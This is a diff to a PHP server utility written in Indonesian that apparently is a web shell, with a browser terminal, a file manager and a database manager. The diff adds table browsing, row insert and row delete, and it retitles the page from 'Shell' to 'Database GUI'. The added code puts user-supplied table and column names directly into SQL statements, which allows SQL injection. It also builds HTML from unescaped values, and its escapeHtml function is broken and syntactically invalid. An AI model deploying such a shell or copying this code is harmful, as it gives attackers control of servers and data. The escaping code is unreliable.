@@ -17,6 +17,7 @@ if (isset($_POST['db_action'])) {
     $pass      = $_POST['db_pass'] ?? '';
     $action    = $_POST['db_action'] ?? 'test';
     $query     = trim($_POST['db_query'] ?? '');
+    $table     = $_POST['db_table'] ?? '';
 
     try {
         if ($conn_type === 'sqlite') {
@@ -40,6 +41,54 @@ if (isset($_POST['db_action'])) {
             }
             $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
             echo json_encode(['ok' => true, 'tables' => $tables]);
+        } elseif ($action === 'browse' && !empty($table)) {
+            // Ambil struktur kolom & data baris tabel
+            $stmtCol = $pdo->query("DESCRIBE `$table`");
+            $columns = $stmtCol->fetchAll(PDO::FETCH_ASSOC);
+
+            $stmtRows = $pdo->query("SELECT * FROM `$table` LIMIT 100");
+            $rows = $stmtRows->fetchAll(PDO::FETCH_ASSOC);
+
+            // Cari kolom Primary Key
+            $primaryKey = '';
+            foreach ($columns as $col) {
+                if ($col['Key'] === 'PRI') {
+                    $primaryKey = $col['Field'];
+                    break;
+                }
+            }
+
+            echo json_encode([
+                'ok' => true, 
+                'table' => $table, 
+                'columns' => $columns, 
+                'rows' => $rows, 
+                'primary_key' => $primaryKey,
+                'count' => count($rows)
+            ]);
+        } elseif ($action === 'insert' && !empty($table)) {
+            $data = $_POST['data'] ?? [];
+            if (empty($data)) {
+                echo json_encode(['ok' => false, 'error' => 'Data input kosong.']);
+                exit;
+            }
+            $fields = array_keys($data);
+            $placeholders = array_map(function($f) { return ":$f"; }, $fields);
+            
+            $sql = "INSERT INTO `$table` (`" . implode('`, `', $fields) . "`) VALUES (" . implode(', ', $placeholders) . ")";
+            $stmt = $pdo->prepare($sql);
+            $stmt->execute($data);
+            echo json_encode(['ok' => true, 'message' => 'Data berhasil ditambahkan!']);
+        } elseif ($action === 'delete' && !empty($table)) {
+            $pk = $_POST['pk_field'] ?? '';
+            $id = $_POST['pk_value'] ?? '';
+            if (empty($pk) || $id === '') {
+                echo json_encode(['ok' => false, 'error' => 'Primary key tidak valid untuk hapus.']);
+                exit;
+            }
+            $stmt = $pdo->prepare("DELETE FROM `$table` WHERE `$pk` = ?");
+            $stmt->execute([$id]);
+            echo json_encode(['ok' => true, 'message' => 'Baris berhasil dihapus.']);
         } elseif ($action === 'query') {
             if ($query === '') {
                 echo json_encode(['ok' => false, 'error' => 'Query kosong.']);
@@ -135,7 +184,7 @@ $modeBuatBaru = isset($_GET['newfile']);
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Server Utility & Shell</title>
+    <title>Server Utility & Database GUI</title>
     <style>
         body { font-family: monospace; background: #121212; color: #e0e0e0; padding: 20px; line-height: 1.5; }
         a { color: #4da6ff; text-decoration: none; }
@@ -154,16 +203,18 @@ $modeBuatBaru = isset($_GET['newfile']);
         .card { background: #1e1e1e; border: 1px solid #333; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
         .actions-group { display: flex; gap: 5px; }
         .db-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; margin-bottom: 10px; }
-        #dbOut { background:#08080a; border:1px solid #1e1e24; border-radius:6px; color:#7ee787; padding:12px; min-height:100px; max-height:40vh; overflow:auto; font-size:12px; margin-top: 10px; }
+        #dbOut { background:#08080a; border:1px solid #1e1e24; border-radius:6px; color:#7ee787; padding:12px; min-height:120px; max-height:50vh; overflow:auto; font-size:12px; margin-top: 10px; }
         table.db-table { width:100%; border-collapse:collapse; margin-top:8px; }
         table.db-table th, table.db-table td { border:1px solid #2a2a30; padding:6px 8px; font-size:11.5px; text-align:left; }
         table.db-table th { background:#141418; color:#9ad; }
+        .table-list-badge { display: inline-block; background: #252530; border: 1px solid #3d3d4f; padding: 5px 10px; margin: 3px; border-radius: 4px; cursor: pointer; color: #7aa2f7; }
+        .table-list-badge:hover { background: #33334d; }
     </style>
 </head>
 <body>
 
     <div style="display:flex; justify-content:space-between; align-items:center;">
-        <h2>Web Terminal & Server Info</h2>
+        <h2>Web File & Database Manager</h2>
     </div>
 
     <?php if (!empty($pesanAksi)) echo "<div class='card'>p: $pesanAksi</div>"; ?>
@@ -197,9 +248,9 @@ $modeBuatBaru = isset($_GET['newfile']);
     </div>
     <?php endif; ?>
 
-    <!-- DATABASE MANAGER (MySQL / PDO) -->
+    <!-- DATABASE MANAGER GUI (PHPMyAdmin-like) -->
     <div class="card">
-        <h3>Database Manager (PDO MySQL)</h3>
+        <h3>Database Manager (Klik & Browse)</h3>
         <div class="db-grid">
             <div>
                 <label><small>DB_CONNECTION</small></label>
@@ -226,16 +277,13 @@ $modeBuatBaru = isset($_GET['newfile']);
                 <input id="db_pass" type="password" placeholder="password">
             </div>
         </div>
-        <div class="row" style="margin-bottom: 10px; display: flex; gap: 8px;">
+        <div class="row" style="margin-bottom: 10px; display: flex; gap: 8px; flex-wrap: wrap;">
             <button type="button" onclick="dbAction('test')" class="btn">Test Koneksi</button>
-            <button type="button" onclick="dbAction('tables')" class="btn">Lihat Tabel</button>
+            <button type="button" onclick="dbAction('tables')" class="btn btn-green">📁 Lihat Daftar Tabel</button>
             <span id="dbStatus" class="meta" style="align-self: center; color: #aaa;"></span>
         </div>
-        <div class="row" style="display: flex; gap: 8px;">
-            <textarea id="dbQuery" placeholder="SELECT * FROM nama_tabel LIMIT 10;" style="flex:1; height:60px; resize:vertical;"></textarea>
-            <button type="button" onclick="dbAction('query')" class="btn btn-green" style="height:60px;">Jalankan Query</button>
-        </div>
-        <div id="dbOut">Output database akan muncul di sini...</div>
+
+        <div id="dbOut">Output database, daftar tabel, dan isi data tabel akan muncul di sini secara interaktif...</div>
     </div>
 
     <!-- TERMINAL SHELL -->
@@ -333,12 +381,14 @@ $modeBuatBaru = isset($_GET['newfile']);
             document.querySelector('input[name="command"]').value = cmd;
         }
 
-        async function dbAction(action) {
+        async function dbAction(action, extraData = {}) {
             const statusEl = document.getElementById('dbStatus');
             const outEl = document.getElementById('dbOut');
             
             statusEl.textContent = 'Memproses...';
-            outEl.textContent = 'Loading...';
+            if (action !== 'browse' && action !== 'delete' && action !== 'insert') {
+                outEl.textContent = 'Loading...';
+            }
 
             const formData = new URLSearchParams();
             formData.append('db_action', action);
@@ -348,7 +398,10 @@ $modeBuatBaru = isset($_GET['newfile']);
             formData.append('db_name', document.getElementById('db_name').value);
             formData.append('db_user', document.getElementById('db_user').value);
             formData.append('db_pass', document.getElementById('db_pass').value);
-            formData.append('db_query', document.getElementById('dbQuery').value);
+
+            for (const key in extraData) {
+                formData.append(key, extraData[key]);
+            }
 
             try {
                 const response = await fetch(window.location.href, {
@@ -364,30 +417,103 @@ $modeBuatBaru = isset($_GET['newfile']);
                 }
 
                 statusEl.textContent = 'Berhasil';
-                if (action === 'test' || (action === 'query' && res.message)) {
-                    outEl.textContent = res.message || JSON.stringify(res, null, 2);
+                if (action === 'test') {
+                    outEl.textContent = res.message;
                 } else if (action === 'tables') {
-                    outEl.innerHTML = '<b>Daftar Tabel:</b><br>' + res.tables.map(t => 
-                        `<a href="#" onclick="document.getElementById('dbQuery').value='SELECT * FROM ' + this.textContent + ' LIMIT 50; dbAction(\\'query\\'); return false;" style="color:#7aa2f7; display:inline-block; margin-right:15px;">${t}</a>`
-                    ).join('');
-                } else if (action === 'query' && res.rows) {
-                    if (res.rows.length === 0) {
-                        outEl.textContent = 'Query berhasil, tetapi tidak ada baris (0 rows) yang dikembalikan.';
+                    if (res.tables.length === 0) {
+                        outEl.textContent = 'Database terhubung, tetapi belum ada tabel di dalamnya.';
                         return;
                     }
-                    let html = `<table class="db-table"><tr>` + res.columns.map(c => `<th>${c}</th>`).join('') + `</tr>`;
-                    for (const row of res.rows) {
-                        html += `<tr>` + res.columns.map(c => `<td>${row[c] !== null ? row[c] : 'NULL'}</td>`).join('') + `</tr>`;
+                    let html = '<b>Daftar Tabel (Klik untuk buka):</b><br><div style="margin-top:8px;">';
+                    res.tables.forEach(t => {
+                        html += `<span class="table-list-badge" onclick="dbAction('browse', {db_table: '${t}'})">🗄️ ${t}</span>`;
+                    });
+                    html += '</div>';
+                    outEl.innerHTML = html;
+                } else if (action === 'browse') {
+                    let table = res.table;
+                    let columns = res.columns;
+                    let rows = res.rows;
+                    let pk = res.primary_key;
+
+                    let html = `<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">`;
+                    html += `<span><b>Tabel:</b> ${table} (${res.count} baris ditampilkan)</span>`;
+                    html += `<button class="btn btn-green" style="padding:4px 8px; font-size:11px;" onclick="showInsertForm('${table}', ${JSON.stringify(columns).replace(/"/g, '"')})">➕ Tambah Data</button>`;
+                    html += `</div>`;
+
+                    if (rows.length === 0) {
+                        html += `<p style="color:#aaa;">Tabel ini masih kosong (0 baris).</p>`;
+                    } else {
+                        html += `<div style="overflow-x:auto;"><table class="db-table"><tr>`;
+                        columns.forEach(c => {
+                            html += `<th>${c.Field} <small style="color:#888;">(${c.Type})</small></th>`;
+                        });
+                        if (pk) html += `<th>Aksi</th>`;
+                        html += `</tr>`;
+
+                        rows.forEach(row => {
+                            html += `<tr>`;
+                            columns.forEach(c => {
+                                let val = row[c.Field];
+                                html += `<td>${val !== null ? escapeHtml(String(val)) : '<span style="color:#777;">NULL</span>'}</td>`;
+                            });
+                            if (pk) {
+                                html += `<td><button class="btn btn-red" style="padding:2px 6px; font-size:10px;" onclick="deleteRow('${table}', '${pk}', '${row[pk]}')">Hapus</button></td>`;
+                            }
+                            html += `</tr>`;
+                        });
+                        html += `</table></div>`;
                     }
-                    html += `</table>`;
-                    outEl.innerHTML = `Menampilkan ${res.count} baris:<br>` + html;
-                } else {
-                    outEl.textContent = JSON.stringify(res, null, 2);
+                    outEl.innerHTML = html;
+                } else if (res.message) {
+                    outEl.textContent = res.message;
                 }
             } catch (e) {
                 statusEl.textContent = 'Error';
                 outEl.textContent = 'Gagal melakukan request AJAX ke server: ' + e.message;
             }
+        }
+
+        function showInsertForm(table, columns) {
+            let html = `<h4>Tambah Data ke Tabel: ${table}</h4>`;
+            html += `<form id="insertForm" onsubmit="submitInsert(event, '${table}')">`;
+            columns.forEach(c => {
+                if (c.Extra && c.Extra.includes('auto_increment')) return; // Skip auto increment
+                html += `<div style="margin-bottom:6px;"><label style="font-size:11px;">${c.Field} (${c.Type})</label>`;
+                html += `<input type="text" name="data[${c.Field}]" placeholder="Nilai ${c.Field}"></div>`;
+            });
+            html += `<button type="submit" class="btn btn-green" style="margin-top:5px;">Simpan Data Baru</button> `;
+            html += `<button type="button" class="btn" style="background:#555;" onclick="dbAction('browse', {db_table: '${table}'})">Batal</button>`;
+            html += `</form>`;
+            document.getElementById('dbOut').innerHTML = html;
+        }
+
+        async function submitInsert(e, table) {
+            e.preventDefault();
+            const form = document.getElementById('insertForm');
+            const formDataObj = new FormData(form);
+            let extra = { db_table: table };
+            for (let [key, value] of formDataObj.entries()) {
+                extra[key] = value;
+            }
+            await dbAction('insert', extra);
+            // Refresh table view
+            dbAction('browse', { db_table: table });
+        }
+
+        async function deleteRow(table, pkField, pkValue) {
+            if (!confirm('Yakin ingin menghapus baris ini?')) return;
+            await dbAction('delete', {
+                db_table: table,
+                pk_field: pkField,
+                pk_value: pkValue
+            });
+            // Refresh table view
+            dbAction('browse', { db_table: table });
+        }
+
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&").replace(/</g, "<").replace(/>/g, ">").replace(/"/g, """).replace(/'/g, "'");
         }
     </script>
 </body>
